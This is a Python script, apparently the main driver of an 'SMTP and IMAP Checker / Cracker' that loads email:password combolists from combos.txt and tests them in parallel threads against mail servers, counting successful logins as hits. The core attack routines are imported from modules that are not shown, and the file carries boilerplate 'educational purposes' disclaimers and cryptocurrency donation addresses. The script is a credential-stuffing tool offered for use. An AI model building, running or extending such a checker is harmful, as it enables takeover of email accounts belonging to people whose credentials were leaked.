# Disclaimer:
# This code/script/application/program is solely for educational and learning purposes.
# All information, datasets, images, code, and materials are presented in good faith and
# intended for instructive use. However, noarche make no representation or warranty, 
# express or implied, regarding the accuracy, adequacy, validity, reliability, availability,
# or completeness of any data or associated materials.
# Under no circumstance shall noarche have any liability to you for any loss, damage, or 
# misinterpretation arising due to the use of or reliance on the provided data. Your utilization
# of the code and your interpretations thereof are undertaken at your own discretion and risk.
#
# By executing script/code/application, the user acknowledges and agrees that they have read, 
# understood, and accepted the terms and conditions (or any other relevant documentation or 
#policy) as provided by noarche.
#
#Visit https://github.com/noarche for more information. 
#
#  _.··._.·°°°·.°·..·°¯°·._.··._.·°¯°·.·° .·°°°°·.·°·._.··._
# ███╗   ██╗ ██████╗  █████╗ ██████╗  ██████╗██╗  ██╗███████╗
# ████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝
# ██╔██╗ ██║██║   ██║███████║██████╔╝██║     ███████║█████╗  
# ██║╚██╗██║██║   ██║██╔══██║██╔══██╗██║     ██╔══██║██╔══╝  
# ██║ ╚████║╚██████╔╝██║  ██║██║  ██║╚██████╗██║  ██║███████╗
# ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
# °°°·._.··._.·°°°·.°·..·°¯°··°¯°·.·°.·°°°°·.·°·._.··._.·°°°

#!/usr/local/opt/python@3.8/bin/python3
# -*- coding: utf-8 -*-

'''

██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗   ██╗ ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    ██║   ██║███║
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    ██║   ██║╚██║
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝ ██║
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║     ╚████╔╝  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═╝ 
         ----------------------------------------

                  *** LEGAL NOTICES ***
                   *** DISCLAIMER ***

The information and/or software provided here is intended solely
for educational purposes and legal penetration testing purposes. 
By accessing or using this information and/or software, you 
acknowledge and agree that you assume full responsibility for your
actions and any consequences that may result from those actions. 
The creators, contributors, and providers of this information 
and/or software shall not be held liable for any misuse or damage
arising from its application. It is your responsibility to ensure 
that your use complies with all applicable laws and regulations. 
This applies to all cases of usage, no matter whether the code as 
a whole or just parts of it are being used.

                   *** SHORT INFO ***

SMTP and IMAP Checker / Cracker for Email:Pass Combolists.
Further Information and Help at:

          https://github.com/noarche/Imap-Recon
'''


# [IMPORTS]
# ---------

import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
from time import sleep
import inc_attackimap as ic
import inc_attacksmtp as sc
from inc_comboloader import comboloader
from inc_etc import clean

# [VARIOUS]
# ---------

main_logo = '''

██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗    ██╗   ██╗ ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║    ██║   ██║███║
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║    ██║   ██║╚██║
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║    ╚██╗ ██╔╝ ██║
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║     ╚████╔╝  ██║
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═══╝   ╚═╝                                                            
          **********************
          Build 1.1 April 7 2024
          **********************
    https://github.com/noarche/Imap-Recon
    
    Tip or donate for faster development:

    (BTC) address bc1qnpjpacyl9sff6r4kfmn7c227ty9g50suhr0y9j
    (ETH) address 0x94FcBab18E4c0b2FAf5050c0c11E056893134266
    (LTC) address ltc1qu7ze2hlnkh440k37nrm4nhpv2dre7fl8xu0egx

'''

# global variables and stuff:
targets_total = 0
targets_left = 0
hits = 0
fails = 0

# [FUNCTIONS]
# -----------

def dns_lookup(domain):
    '''
    Function to perform a DNS lookup using dnspython.

    :param str domain: Domain to perform DNS lookup on.
    :return: List of IP addresses associated with the domain.
    '''
    try:
        result = dns.resolver.resolve(domain, 'A')
        return [ip.to_text() for ip in result]
    except dns.resolver.NoAnswer:
        return []
    except dns.resolver.NXDOMAIN:
        return []
    except Exception as e:
        print(f"DNS lookup error: {e}")
        return []

def process_target(checker_type, target, default_timeout, default_email):
    '''
    Process a single target using the specified checker.

    :param str checker_type: smtp or imap
    :param str target: the target to check
    :param float default_timeout: timeout for server connection
    :param str default_email: user's email for test messages (SMTP only)
    :return: bool, True if successful, False otherwise
    '''
    try:
        if checker_type == 'smtp':
            return sc.smtpchecker(
                float(default_timeout),
                str(default_email),
                str(target)
            )
        elif checker_type == 'imap':
            return ic.imapchecker(
                float(default_timeout),
                str(target)
            )
    except Exception as e:
        print(f"Error processing target {target}: {e}")
    return False

def checker(checker_type, default_threads, default_timeout, default_email):
    '''
    Function to control the import of combos, to start threads etc.

    :param str checker_type: smtp or imap
    :param int default_threads: amount of threads to use
    :param float default_timeout: timeout for server-connections
    :param str default_email: users's email for test-messages (SMTP only)
    :return: True (no errors occurred), False (errors occurred)
    '''
    global targets_total, targets_left, hits, fails

    try:
        # Load combos from default file:
        combofile = 'combos.txt'
        print('Step#1: Loading combos from file ...')
        try:
            combos = comboloader(combofile)
        except:
            combos = []

        targets_total = len(combos)
        targets_left = targets_total

        if targets_total > 0:
            print(f'Done! Amount of combos loaded: {targets_total}\n\n')
        else:
            print('Done! No combos loaded.\n\n')
            return False

        # Start checker threads using ThreadPoolExecutor:
        print(f'Step#2: Starting threads for {checker_type} checker ...')

        with ThreadPoolExecutor(max_workers=default_threads) as executor:
            futures = {
                executor.submit(process_target, checker_type, target, default_timeout, default_email): target
                for target in combos
            }

            for future in as_completed(futures):
                result = future.result()
                if result:
                    hits += 1
                else:
                    fails += 1
                targets_left -= 1
                # Update stats in window title:
                titlestats = f'L:{targets_left} # H:{hits} # F:{fails}'
                sys.stdout.write('\33]0;' + titlestats + '\a')
                sys.stdout.flush()

        print('Step#3: Finishing checking ...')
        print('Done!\n\n')

        clean()
        return True

    except Exception as e:
        print(f"Checker encountered an error: {e}")
        clean()
        return False

def main():
    '''
    Simple function for main menu and checker setup.

    :return: None
    '''
    # Set default values for needed variables:
    default_timeout = 3.0
    default_threads = 5
    default_email = 'user@email.com'
    checker_type = 'smtp'

    clean()
    print(main_logo + '\n\n')

    # Get values for variables from user input:
    try:
        # Type of checking (SMTP / IMAP):
        checker_choice = int(input('Checker Type [1 = smtp or 2 = imap]: '))
        if checker_choice == 2:
            checker_type = 'imap'
        if checker_choice == 1:
            # (SMTP only) user's email address for test mailer:
            default_email = input('Your Email [e.g. your@email.com]: ')

        # Threads to use:
        default_threads = int(input('\033[34mChecker Threads [e.g. 10]: \033[0m'))

        # Default timeout for connections:
        default_timeout = float(input('\033[34mChecker Timeout in Seconds [e.g. 1.8]: \033[0m'))

        # Ask for starting the checker:
        start_now = input('\n\nStart Checker = [y] or Exit = [n]: \033[0m')

        # Start checker for option "yes":
        if start_now in ['y', 'Y', 'yes', 'Yes']:
            clean()
            print(
                '\n\n'
                + f'Recon V1 - running ({checker_type}) checker:\n'
                + 38*'-' + '\n\n'
                + f'user email: {default_email}\n'
                + f'threads:    {default_threads}\n'
                + f'timeout:    {default_timeout}\n\n'
                + 38*'-' + '\n'
            )
            print(
                'Tip or donate for faster development:\n\n'
                + '    (BTC) address bc1qnpjpacyl9sff6r4kfmn7c227ty9g50suhr0y9j\n'
                + '    (ETH) address 0x94FcBab18E4c0b2FAf5050c0c11E056893134266\n'
                + '    (LTC) address ltc1qu7ze2hlnkh440k37nrm4nhpv2dre7fl8xu0egx\n\n'
            )
            print('\033[34mPlease be patient and wait while all combos are being checked ...\n\n\033[0m')
            checker_result = checker(checker_type, default_threads, default_timeout, default_email)

            # Show summary and quit:
            if checker_result:
                print(
                    '\n\n'
                    + f'Recon V1 - ({checker_type}) checker results:\n'
                    + 38*'-' + '\n\n'
                    + f'combos:    {targets_total}\n'
                    + f'hits:      {hits}\n'
                    + f'fails:     {fails}\n\n'
                    + 38*'-' + '\n'
                )
                print(
                    'Tip or donate for faster development:\n\n'
                    + '    (BTC) address bc1qnpjpacyl9sff6r4kfmn7c227ty9g50suhr0y9j\n'
                    + '    (ETH) address 0x94FcBab18E4c0b2FAf5050c0c11E056893134266\n'
                    + '    (LTC) address ltc1qu7ze2hlnkh440k37nrm4nhpv2dre7fl8xu0egx\n\n'
                )
                print('Press [ENTER] to exit ...')
                input()
            else:
                clean()
                print(
                    '\n\n\n'
                    + '*** SORRY ***\n'
                    + 'Errors occurred while checking your combos! Running the checker failed.\n'
                    + 'Press [ENTER] to exit ...'
                )
                input()
                clean()
        # Exit for option "no":
        elif start_now in ['n', 'N', 'no', 'No']:
            clean()
        else:
            clean()
            print('\n\n*** SORRY ***\nSomething went wrong. Press [ENTER] and try again, please!\n')
            input()
    except Exception as e:
        print(f"Main encountered an error: {e}")
        clean()
        print('\n\n*** SORRY ***\nAn error occurred. Press [ENTER] and try again, please!\n')
        input()
    sys.exit()

# [MAIN]
# ------

main()


# Disclaimer:
# This code/script/application/program is solely for educational and learning purposes.
# All information, datasets, images, code, and materials are presented in good faith and
# intended for instructive use. However, noarche make no representation or warranty, 
# express or implied, regarding the accuracy, adequacy, validity, reliability, availability,
# or completeness of any data or associated materials.
# Under no circumstance shall noarche have any liability to you for any loss, damage, or 
# misinterpretation arising due to the use of or reliance on the provided data. Your utilization
# of the code and your interpretations thereof are undertaken at your own discretion and risk.
#
# By executing script/code/application, the user acknowledges and agrees that they have read, 
# understood, and accepted the terms and conditions (or any other relevant documentation or 
#policy) as provided by noarche.
#
#Visit https://github.com/noarche for more information. 
#
#  _.··._.·°°°·.°·..·°¯°·._.··._.·°¯°·.·° .·°°°°·.·°·._.··._
# ███╗   ██╗ ██████╗  █████╗ ██████╗  ██████╗██╗  ██╗███████╗
# ████╗  ██║██╔═══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝
# ██╔██╗ ██║██║   ██║███████║██████╔╝██║     ███████║█████╗  
# ██║╚██╗██║██║   ██║██╔══██║██╔══██╗██║     ██╔══██║██╔══╝  
# ██║ ╚████║╚██████╔╝██║  ██║██║  ██║╚██████╗██║  ██║███████╗
# ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
# °°°·._.··._.·°°°·.°·..·°¯°··°¯°·.·°.·°°°°·.·°·._.··._.·°°°